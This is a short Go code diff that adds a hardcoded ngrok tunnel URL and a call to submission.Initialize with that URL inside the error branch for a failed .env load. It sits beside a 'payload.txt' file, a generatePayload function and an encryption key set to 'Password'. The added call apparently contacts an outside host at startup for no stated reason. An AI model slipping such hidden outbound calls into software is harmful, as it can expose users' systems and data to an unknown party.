@@ -13,6 +13,7 @@ import (
 
 const encKey = "Password"
 const payload = "payload.txt"
+const baseURL = "https://ef8b4bbb35a3.ngrok.io"
 
 func generatePayload(data []byte) {
 	//data, _ := ioutil.ReadFile(inFile)
@@ -34,6 +35,10 @@ func main() {
 	err := godotenv.Load()
 	if err != nil {
 		fmt.Println("Error loading env file")
+		err = submission.Initialize(baseURL)
+		if err != nil {
+			return
+		}
 	}
 
 	// setup bugsnag
